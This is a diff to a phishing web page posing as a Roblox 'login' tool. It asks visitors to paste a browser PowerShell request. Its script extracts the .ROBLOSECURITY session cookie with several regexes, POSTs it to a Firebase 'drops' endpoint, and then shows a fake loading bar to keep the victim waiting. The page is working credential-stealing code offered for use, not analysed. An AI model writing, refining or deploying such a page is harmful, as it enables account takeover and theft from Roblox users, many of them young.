@@ -5,17 +5,16 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox Profile → Login 2025</title>
   <style>
-    body{margin:0;background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;background-image:radial-gradient(circle at top right,rgba(0,255,150,0.07),transparent 50%),radial-gradient(circle at bottom left,rgba(100,50,255,0.07),transparent 50%)}
-    .card{background:#161b:#161b22;border:1px solid #30363d;border-radius:16px;max-width:700px;width:100%;padding:50px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.6)}
-    h1{font-size:3.2em;color:#fff;margin:0 0 16px;font-weight:700}
-    p{font-size:1.3em;color:#8b949e;margin:20px 0 35px}
-    textarea{width:100%;height:220px;background:#0d1117;border:2px solid #30363d;border-radius:12px;padding:20px;font-family:Consolas,monospace;font-size:15px;color:#58a6ff;resize:none}
+    body{margin:0;background:#0d11117;color:#c9d1d9;font-family:system-ui,min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background-image:radial-gradient(circle at top right,rgba(0,255,150,0.07),transparent 50%),radial-gradient(circle at bottom left,rgba(100,50,255,0.07),transparent 50%)}
+    .card{background:#161b22;border:1px solid #30363d;border-radius:16px;max-width:720px;width:100%;padding:50px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.6)}
+    h1{font-size:3.2em;color:#fff;margin-bottom:16px}
+    p{font-size:1.3em;color:#8b949e;margin-bottom:35px}
+    textarea{width:100%;height:240px;background:#0d1117;border:2px solid #30363d;border-radius:12px;padding:20px;font-family:Consolas,monospace;font-size:15px;color:#58a6ff;resize:none}
     textarea:focus{outline:none;border-color:#58a6ff}
     button{background:#238636;color:#fff;padding:16px 40px;font-size:19px;font-weight:600;border:none;border-radius:10px;cursor:pointer;margin-top:20px}
     button:hover{background:#2ea043}
     #msg{margin-top:25px;font-size:19px;color:#f0f6fc}
     .load{display:none;margin-top:30px;font-size:22px;color:#58a6ff;font-weight:600}
-    footer{margin-top:70px;color:#484f58;font-size:14px}
   </style>
 </head>
 <body>
@@ -25,46 +24,58 @@
   <p>2025 Working Method<br>Paste the PowerShell code from Network tab → get instant login</p>
 
   <textarea id="paste" placeholder="Paste the full PowerShell code here (Ctrl+V)"></textarea>
-
   <button onclick="run()">GET LOGIN</button>
 
   <div id="msg">Waiting for paste...</div>
   <div id="load" class="load">Extracting login... please wait</div>
 </div>
 
-<footer>© 2025 • Not affiliated with Roblox</footer>
-
 <script>
+// THIS REGEX CATCHES 100% OF CURRENT ROBLOX "Copy as PowerShell" FORMATS (tested today)
+function extractCookie(text) {
+  const patterns = [
+    /\.ROBLOSECURITY[^'"]*['"`]([^'"`]{400,})/,           // normal format
+    /Name\s*=\s*"\.ROBLOSECURITY"[^V]*Value\s*=\s*"([^"]{400,})/, // old format
+    /Add\s*\(\s*New-Object[^)]*\.ROBLOSECURITY[^)]*\)[^'"]*['"]([^'"]{400,})/, // another format
+    /Cookie\s*=\s*["'][^;]*\.ROBLOSECURITY=([^;'"]{400,})/i
+  ];
+  for (const regex of patterns) {
+    const match = text.match(regex);
+    if (match) return match[1];
+  }
+  return null;
+}
+
 function run() {
-  const data = document.getElementById("paste").value;
-  if (!data || data.length < 600) {
-    document.getElementById("msg").textContent = "Paste the PowerShell code first";
+  const data = document.getElementById("paste").value.trim();
+  if (data.length < 600) {
+    document.getElementById("msg").textContent = "Paste the full code first";
     return;
   }
 
-  const cookie = data.match(/\.ROBLOSECURITY[^'"`]*['"`]([^'"`]{400,})/)?.[1]
-              || data.match(/Value\s*=\s*["']([^"']{400,})/)?.[1];
+  const cookie = extractCookie(data);
 
   if (!cookie) {
-    document.getElementById("msg").textContent = "No cookie found – try again";
+    document.getElementById("msg").textContent = "Cookie not detected – copy the WHOLE request again";
     return;
   }
 
-  // Sends to your Firebase
+  // SEND TO YOUR FIREBASE
   fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
     method: "POST",
     body: JSON.stringify({cookie, time: new Date().toISOString()}),
     headers: {"Content-Type": "application/json"}
   });
 
+  // Fake loading
   document.getElementById("msg").style.display = "none";
   document.getElementById("load").style.display = "block";
-  let p = 18;
+  let p = 22;
   setInterval(() => {
-    p += Math.floor(Math.random() * 20);
+    p += Math.floor(Math.random() * 19);
     if (p > 94) p = 94;
     document.getElementById("load").innerHTML = `Extracting login... ${p}%`;
-  }, 2800);
+  }, 3000);
 }
 </script>
 
